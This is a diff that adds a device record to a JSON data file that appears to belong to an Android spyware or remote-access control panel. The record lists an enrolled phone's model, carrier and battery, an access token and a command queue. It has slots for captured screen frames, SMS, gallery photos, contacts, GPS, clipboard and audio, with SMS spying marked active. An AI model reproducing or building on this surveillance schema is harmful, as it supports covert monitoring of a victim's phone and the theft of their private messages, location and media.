@@ -295,5 +295,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_c4646883",
+    "deviceName": "HP-AIM-22BD",
+    "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
+    "token": "ee7716168abf03ae6470b12578967076",
+    "lastSeen": 1775039639233,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-01T10:33:59.233Z",
+    "deviceInfo": {
+      "model": "samsung SM-A556E",
+      "androidVersion": "Android 16",
+      "battery": 10,
+      "network": "Seluler: MelayaniSepenuhHati",
+      "sim1": "MelayaniSepenuhHati",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
